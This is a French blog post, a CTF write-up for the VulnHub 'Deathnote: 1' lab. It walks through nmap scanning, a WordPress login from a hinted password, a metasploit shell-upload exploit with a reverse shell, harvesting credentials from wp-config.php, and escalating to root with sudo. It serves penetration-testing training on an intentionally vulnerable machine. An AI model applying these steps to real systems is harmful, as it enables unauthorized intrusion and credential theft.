{"hash":"e9e710b63b02d049a9f8a5359c5c22618737fe2f","data":{"post":{"title":"CTF Deathnote: 1","date":"13 September 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.2</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.19</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir Deathnote1 &amp;&amp; cd Deathnote1</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -sV -sT -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">7</span>.9p1 Debian <span class=\"token number\">10</span>+deb10u2 <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.38 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Debian<span class=\"token punctuation\">))</span></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur Apache 2.4.38 sur le port <strong>80</strong>.</p>\n<p>En voulant accéder au site, on peut constater qu'il faut modifier le fichier <strong>hosts</strong> pour lui assigner le domaine \"deathnote.vuln\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> /etc/hosts\n<span class=\"token number\">192.168</span>.1.19    deathnote.vuln</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Sur la page <strong>Wordpress</strong>, on voit que c'est l'utilisateur \"kira\" qui a rédigé l'article et en scrollant, on tombe sur ce message \"my fav line is iamjustic3\". Sur la page de login <a href=\"http://deathnote.vuln/wordpress/wp-login.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://deathnote.vuln/wordpress/wp-login.php</a>, on rentre \"kira\" et le mot de passe, par déduction \"iamjustic3\".</p>\n<h2>Pénétration</h2>\n<p>Pour se connecter à la machine, on peut utiliser l'outil <strong>metasploit</strong> pour lancer l'exploit \"wp_admin_shell_upload\" qui va exécuter un reverse shell.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ msfconsole\nmsf6 <span class=\"token operator\">></span> use exploit/unix/webapp/wp_admin_shell_upload\nmsf6 exploit<span class=\"token punctuation\">(</span>unix/webapp/wp_admin_shell_upload<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> show options</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>On renseigne l'adresse de destination.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/webapp/wp_admin_shell_upload<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> RHOSTS <span class=\"token number\">192.168</span>.1.19\nRHOSTS <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">192.168</span>.1.19</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Puis le chemin de <strong>Wordpress</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/webapp/wp_admin_shell_upload<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> TARGETURI /wordpress\nTARGETURI <span class=\"token operator\">=</span><span class=\"token operator\">></span> /wordpress</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Puis le nom de l'utilisateur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/webapp/wp_admin_shell_upload<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> USERNAME kira\nUSERNAME <span class=\"token operator\">=</span><span class=\"token operator\">></span> kira</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Puis le mot de passe.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/webapp/wp_admin_shell_upload<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> PASSWORD iamjustic3\nPASSWORD <span class=\"token operator\">=</span><span class=\"token operator\">></span> iamjustic3</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Et on lance l'exploit.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>unix/webapp/wp_admin_shell_upload<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> run</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Le script s'exécute correctement. On est connecté au serveur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ meterpreter <span class=\"token operator\">></span> shell\npython -c <span class=\"token string\">'import pty; pty.spawn(\"/bin/sh\")'</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On trouve un fichier avec du <strong>brainfuck</strong> dans le répertoire de l'utilisateur \"l\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /home/l/user.txt\n++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">></span>+<span class=\"token operator\">></span>+++<span class=\"token operator\">></span>+++++++<span class=\"token operator\">></span>++++++++++<span class=\"token operator\">&lt;&lt;&lt;</span><span class=\"token operator\">&lt;</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>+++++.<span class=\"token operator\">&lt;&lt;</span>++.<span class=\"token operator\">>></span>+++++++++++.------------.+.+++++.---.<span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>++++++++++.<span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>--------------.++++++++.+++++.<span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>.------------.---.<span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>++++++++++++++.-----------.---.+++++++<span class=\"token punctuation\">..</span><span class=\"token operator\">&lt;&lt;</span>.++++++++++++.------------.<span class=\"token operator\">>></span>----------.+++++++++++++++++++.-.<span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>+++++.----------.++++++.<span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>++.--------.-.++++++.<span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>------------------.+++.<span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>----.+.++++++++++.-------.<span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>+++++++++++++++.-----.<span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>----.--.+++<span class=\"token punctuation\">..</span><span class=\"token operator\">&lt;&lt;</span>.<span class=\"token operator\">>></span>+.--------.<span class=\"token operator\">&lt;&lt;</span>.+++++++++++++.<span class=\"token operator\">>></span>++++++.--.+++++++++.-----------------.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>\"i think u got the shell , but you wont be able to kill me -kira\". De toute évidence, c'est une fausse piste.</p>\n<p>En consultant le répertoire de l'utilisateur \"kira\", on trouve une info intéressante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /home/kira/.ssh/authorized_keys\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3/Jy93n0NfPqOX7HGkLBasYR0v/IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj/6vBi+wMyFF3jQhP4Su72ssLH1n/E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k/POyhURC6MW0V/aQICFZ6z l@deathnote</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Cela signifie que l'utilisateur \"l\" est enregistré dans <strong>SSH</strong> pour se connecter au compte de \"kira\".</p>\n<p>On retrouve le mot de passe de l'utilisateur \"l\" dans le fichier de configuration de <strong>Wordpress</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /var/www/deathnote.vuln/wordpress/wp-config.php\n/** MySQL database username */\ndefine<span class=\"token punctuation\">(</span> <span class=\"token string\">'DB_USER'</span>, <span class=\"token string\">'l'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n/** MySQL database password */\ndefine<span class=\"token punctuation\">(</span> <span class=\"token string\">'DB_PASSWORD'</span>, <span class=\"token string\">'death4me'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On peut désormais se connecter avec cet utilisateur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token function\">ssh</span> l@<span class=\"token variable\">$IP</span>\nl@192.168.1.19's password: death4me</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>Puis se connecter avec le compte \"kira\" sans spécifier de mot de passe.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> kira@localhost\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>kira<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>kira<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>kira<span class=\"token punctuation\">)</span>,27<span class=\"token punctuation\">(</span>sudo<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>On trouve le premier flag.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> kira.txt\ncGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>En farvouillant partout, on trouve dans le répertoire \"/opt\", un dossier \"L\" avec un indice</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /opt/L/fake-notebook-rule/hint\nuse cyberchef</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Puis on consulte le fichier concerné.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /opt/L/fake-notebook-rule/case.wav\n<span class=\"token number\">63</span> <span class=\"token number\">47</span> <span class=\"token number\">46</span> 7a <span class=\"token number\">63</span> <span class=\"token number\">33</span> <span class=\"token number\">64</span> 6b <span class=\"token number\">49</span> <span class=\"token number\">44</span> 6f <span class=\"token number\">67</span> <span class=\"token number\">61</span> <span class=\"token number\">32</span> 6c <span class=\"token number\">79</span> <span class=\"token number\">59</span> <span class=\"token number\">57</span> 6c 7a 5a <span class=\"token number\">58</span> 5a <span class=\"token number\">70</span> <span class=\"token number\">62</span> <span class=\"token number\">43</span> <span class=\"token number\">41</span> 3d</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Sur <a href=\"https://gchq.github.io/CyberChef/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">cyberchef</a>, en décodant cette chaine hexadécimal, on trouve la valeur en <strong>Base64</strong> <code class=\"language-text\">cGFzc3dkIDoga2lyYWlzZXZpbCA=</code> que l'on décode avec la ligne de commande ci-dessous.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'cGFzc3dkIDoga2lyYWlzZXZpbCA='</span> <span class=\"token operator\">|</span> base64 -d\n<span class=\"token function\">passwd</span> <span class=\"token builtin class-name\">:</span> kiraisevil</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On a bien le mot de passe de l'utilisateur donc on peut consulter ses privilèges.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> -l\n<span class=\"token punctuation\">[</span>sudo<span class=\"token punctuation\">]</span> password <span class=\"token keyword\">for</span> kira: \nMatching Defaults entries <span class=\"token keyword\">for</span> kira on deathnote:\n    env_reset, mail_badpass, <span class=\"token assign-left variable\">secure_path</span><span class=\"token operator\">=</span>/usr/local/sbin<span class=\"token punctuation\">\\</span>:/usr/local/bin<span class=\"token punctuation\">\\</span>:/usr/sbin<span class=\"token punctuation\">\\</span>:/usr/bin<span class=\"token punctuation\">\\</span>:/sbin<span class=\"token punctuation\">\\</span>:/bin\n\nUser kira may run the following commands on deathnote:\n    <span class=\"token punctuation\">(</span>ALL <span class=\"token builtin class-name\">:</span> ALL<span class=\"token punctuation\">)</span> ALL</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>L'utilisateur a tous les droits.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> <span class=\"token function\">bash</span>\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>\n$ <span class=\"token function\">cat</span> /root/root.txt</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2>Préambule</h2>\n<p>Il existait une autre voie lors de l'énumération pour trouver le mot de passe de l'utilisateur \"l\". En effet, dans les fichiers d'upload, il y a un fichier contenant une liste de mots de passe à l'adresse suivante <a href=\"http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt</a>. Ainsi, on aurait pu retrouver le mot de passe via l'outil de brute force <strong>Hydra</strong>.</p>\n","download":"https://www.vulnhub.com/entry/deathnote-1,739","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":5,"parts":[]}},"context":{}}